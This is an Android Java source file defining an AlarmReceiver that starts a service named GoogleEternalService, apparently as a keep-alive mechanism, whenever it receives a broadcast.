package com.google.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class AlarmReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		//启动服务
		Intent i = new Intent(context, GoogleEternalService.class);
		context.startService(i);
	}

}
